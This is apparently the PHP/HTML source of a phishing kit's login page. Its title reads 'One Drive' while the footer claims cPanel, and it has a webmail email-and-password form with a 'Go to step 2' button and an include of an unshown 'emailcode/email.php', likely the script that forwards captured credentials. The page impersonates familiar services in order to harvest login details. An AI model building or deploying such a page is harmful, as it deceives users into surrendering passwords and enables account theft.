<?php
require_once('emailcode/email.php')
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>One Drive</title>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <!-- Font Awesome CSS -->
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous">
    <!-- jQuery first, then Tether, then Bootstrap JS. -->
    <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
</head>
<body>

<div class="webmail">
    <div class="container">
        <div class="row">
            <div class="col-md-2 col-lg-2 col-sm-2 col-xs-12">

            </div>
            <div class="col-md-8 col-lg-8 col-sm-8 col-xs-12">
                <div class="webmaillogo">
                    <img class="img-fluid" src="images/webmaillogo.png" alt="Logo" />
                </div>
                <div class="webmailloginform">
                    <form methed="post" action="" name="webmail">
                    <div class="form-group orangeclr">
                        <label for="email">Email Address</label>
                        <div class="input-group mb-2 mr-sm-2 mb-sm-0">
                            <div class="input-group-addon" style="width: 2.6rem"><i class="fa fa-at"></i></div>
                            <input type="text" name="email" class="form-control" id="email"
                                     placeholder="you@example.com" required autofocus>
                        </div>
                    </div>
                    <div class="form-group orangeclr">
                        <label class="" for="password">Password</label>
                        <div class="input-group mb-2 mr-sm-2 mb-sm-0">
                            <div class="input-group-addon" style="width: 2.6rem"><i class="fa fa-key"></i></div>
                            <input type="password" name="password" class="form-control" id="password"
                                   placeholder="Password" required>
                        </div>
                    </div>
                    <div class="gostepbtn">
                        <input type="hidden" name="logintype" value="webmail">
                        <input type="submit" name="submit_btn" value="Go to step 2" class="gostep" />
                    </div>
                 </form>
                </div>
            </div>
            <div class="col-md-2 col-lg-2 col-sm-2 col-xs-12">

            </div>
        </div>
    </div>
</div>
<footer>
    <div class="container">
        <div class="row">
            <div class="col-md-2 col-lg-2 col-sm-2 col-xs-12"></div>
            <div class="col-md-8 col-lg-8 col-sm-8 col-xs-12">
                <div class="footermenu">
                    <ul>
                        <li><a href="#">English</a></li>
                        <li><a href="#">Cestina</a></li>
                        <li><a href="#">Dansk</a></li>
                        <li><a href="#">Deutsch</a></li>
                        <li><a href="#">Espanol</a></li>
                        <li><a href="#">Spanish</a></li>
                        <li><a href="#">Arabic</a></li>
                        <li><a href="#">Espanollatinoamericano</a></li>
                    </ul>
                </div>
            </div>
            <div class="col-md-2 col-lg-2 col-sm-2 col-xs-12"></div>
        </div>
        <div class="row">
            <div class="copyright">
                    Copyright &#169; 2018 cPanel, Inc.
            </div>
        </div>
    </div>
</footer>
</body>
</html>
